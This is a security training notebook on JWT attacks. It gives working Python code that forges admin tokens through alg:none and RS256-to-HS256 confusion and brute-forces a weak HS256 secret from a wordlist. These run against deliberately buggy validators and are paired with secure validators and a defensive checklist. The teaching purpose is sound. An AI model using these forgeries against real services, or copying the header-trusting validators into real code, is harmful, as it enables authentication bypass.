# 04. JWT Attacks

## Background

JSON Web Tokens are used everywhere — session tokens, API keys, OIDC ID tokens, service-to-service auth. Their flexibility is also their vulnerability surface. The JWT specification allows the token itself to declare its signing algorithm, which has enabled a class of attacks where an attacker manipulates the `alg` header to downgrade verification or bypass it entirely.

## What You'll Learn

- Algorithm confusion: `alg:none` (no signature required)
- RS256 to HS256 confusion: using the public key as an HMAC secret
- Weak secret brute-forcing with a known wordlist
- Proper defenses: whitelist algorithms, never use header-declared alg, use strong secrets
- Building a secure JWT library that blocks all three attack patterns

## Why This Matters

CVE-2015-9235 (critical, CVSS 9.8) was the `alg:none` vulnerability in jsonwebtoken. The RS256→HS256 confusion was discovered by Tim McLean (2015) and affects any library that accepts the header's `alg` claim. These are not theoretical — they have been exploited against production systems including auth0 and multiple enterprise SSOs.

In [ ]:
import json, base64, hashlib, hmac, secrets, time
import matplotlib.pyplot as plt
import numpy as np

def b64url_encode(data):
    return base64.urlsafe_b64encode(data if isinstance(data,bytes) else data.encode()).rstrip(b'=').decode()

def b64url_decode(s):
    pad = 4 - len(s) % 4
    if pad != 4: s += '=' * pad
    return base64.urlsafe_b64decode(s)

def decode_jwt_parts(token):
    parts = token.split('.')
    h = json.loads(b64url_decode(parts[0]))
    p = json.loads(b64url_decode(parts[1]))
    return h, p, parts[2] if len(parts) > 2 else ''

plt.style.use('seaborn-v0_8-whitegrid')
print('Imports ready')


## 1. Attack: alg:none

In [ ]:
SECRET = b'super_secret_signing_key_do_not_share'

def sign_hs256(header, payload, secret):
    h = b64url_encode(json.dumps(header, separators=(',',':')))
    p = b64url_encode(json.dumps(payload, separators=(',',':')))
    sig = b64url_encode(hmac.new(secret, f'{h}.{p}'.encode(), hashlib.sha256).digest())
    return f'{h}.{p}.{sig}'

# Legitimate token
now = int(time.time())
legit = sign_hs256(
    {'alg':'HS256','typ':'JWT'},
    {'sub':'user123','role':'user','exp': now+3600},
    SECRET
)
print(f'Legitimate: {legit[:60]}...')

# alg:none attack: forge admin token with no signature
h_evil = b64url_encode(json.dumps({'alg':'none','typ':'JWT'}, separators=(',',':')))
p_evil = b64url_encode(json.dumps({'sub':'user123','role':'admin','exp':now+3600}, separators=(',',':')))
forged_none = f'{h_evil}.{p_evil}.'
print(f'Forged (alg:none): {forged_none[:60]}...')

# Vulnerable validator (accepts alg from header)
def validate_vulnerable(token, secret):
    h, p, sig = decode_jwt_parts(token)
    alg = h.get('alg')
    if alg == 'none':
        return True, p   # BUG: no verification!
    raw = f'{token.rsplit(".",1)[0]}'.encode()
    expected = b64url_encode(hmac.new(secret, raw, hashlib.sha256).digest())
    return hmac.compare_digest(expected, sig), p

# Secure validator (whitelist, never trust header)
def validate_secure(token, secret):
    h, p, sig = decode_jwt_parts(token)
    if h.get('alg') not in ('HS256',):   # explicit whitelist only
        return False, {}
    raw = token.rsplit('.',1)[0].encode()
    expected = b64url_encode(hmac.new(secret, raw, hashlib.sha256).digest())
    if not hmac.compare_digest(expected, sig): return False, {}
    if time.time() > p.get('exp', 0): return False, {}
    return True, p

ok_vuln, claims_vuln = validate_vulnerable(forged_none, SECRET)
ok_safe, claims_safe = validate_secure(forged_none, SECRET)
print(f'Vulnerable validator accepts forged admin token: {ok_vuln} (role={claims_vuln.get("role")})')
print(f'Secure validator accepts forged admin token:     {ok_safe}')


## 2. Attack: RS256 to HS256 Algorithm Confusion

If a server uses RS256 (asymmetric) but the library accepts the `alg` claim from the header, an attacker can forge a token by:
1. Setting `alg` to `HS256` in the header
2. Signing with the **server's public key** as the HMAC secret

The server then verifies using its own public key (which it trusts) as an HMAC key — and the verification passes.

In [ ]:
# Simulate with a fake 'public key' string
FAKE_PUBLIC_KEY = b'-----BEGIN PUBLIC KEY-----\nMIIBIjAN...\n-----END PUBLIC KEY-----'

def rs256_to_hs256_attack(legitimate_token, public_key_bytes):
    _, payload, _ = decode_jwt_parts(legitimate_token)
    payload['role'] = 'admin'
    h = b64url_encode(json.dumps({'alg':'HS256','typ':'JWT'}, separators=(',',':')))
    p = b64url_encode(json.dumps(payload, separators=(',',':')))
    sig = b64url_encode(hmac.new(public_key_bytes, f'{h}.{p}'.encode(), hashlib.sha256).digest())
    return f'{h}.{p}.{sig}'

def validate_confused(token, rs256_public_key, hs256_secret):
    h, p, sig = decode_jwt_parts(token)
    alg = h.get('alg')   # BUG: trusting header
    if alg == 'HS256':
        raw = token.rsplit('.',1)[0].encode()
        # Server uses its public key as HMAC secret (confused!)
        expected = b64url_encode(hmac.new(rs256_public_key, raw, hashlib.sha256).digest())
        return hmac.compare_digest(expected, sig), p
    return False, {}

forged_hs = rs256_to_hs256_attack(legit, FAKE_PUBLIC_KEY)
ok, p = validate_confused(forged_hs, FAKE_PUBLIC_KEY, SECRET)
print(f'RS256->HS256 confused validator accepts forged admin: {ok} role={p.get("role")}')
print('Fix: bind algorithm to key type at registration time; never read alg from token header')


## 3. Weak Secret Brute-Force

In [ ]:
import itertools, string

def brute_force_hs256(token, wordlist):
    h_b64, p_b64, sig = token.split('.')
    signing_input = f'{h_b64}.{p_b64}'.encode()
    for candidate in wordlist:
        key = candidate.encode() if isinstance(candidate, str) else candidate
        expected = b64url_encode(hmac.new(key, signing_input, hashlib.sha256).digest())
        if hmac.compare_digest(expected, sig):
            return candidate
    return None

# Weak secret token
weak_token = sign_hs256({'alg':'HS256','typ':'JWT'},
                        {'sub':'user123','role':'user','exp':int(time.time())+3600},
                        b'password123')

wordlist = ['secret','password','123456','password123','admin','qwerty','letmein','abc123']
found = brute_force_hs256(weak_token, wordlist)
print(f'Brute-force result: {found}')

# Strong secret (token_urlsafe(32) = 256 bits)
strong_secret = secrets.token_bytes(32)
strong_token  = sign_hs256({'alg':'HS256','typ':'JWT'},
                            {'sub':'user123','role':'user','exp':int(time.time())+3600},
                            strong_secret)
found2 = brute_force_hs256(strong_token, wordlist)
print(f'Strong secret brute-force: {found2}  (None = not cracked)')
print(f'Strong secret (hex): {strong_secret.hex()}')


## 4. JWT Security Checklist

In [ ]:
print('=== JWT Implementation Security Checklist ===')
checklist = [
    ('NEVER trust alg from token header', 'Bind expected alg to key at registration time'),
    ('Whitelist allowed algorithms',      'RS256 or HS256 only; reject none/HS384/PS256 unless explicitly needed'),
    ('Use strong secrets (>= 256 bits)', 'secrets.token_bytes(32) minimum for HS256'),
    ('Validate exp on every request',     'time.time() > payload["exp"] => reject'),
    ('Validate iss and aud',              'Prevents cross-tenant token reuse'),
    ('Validate nonce for OIDC',           'Prevents authorization code replay'),
    ('Use timing-safe comparison',        'hmac.compare_digest not == for signatures'),
    ('Rotate signing keys',               'kid in header + JWKS endpoint for rotation'),
    ('Short expiry + refresh tokens',     'AT expiry 15min; RT can be longer but revocable'),
]
for check, fix in checklist:
    print(f'  [x] {check}')
    print(f'      -> {fix}')
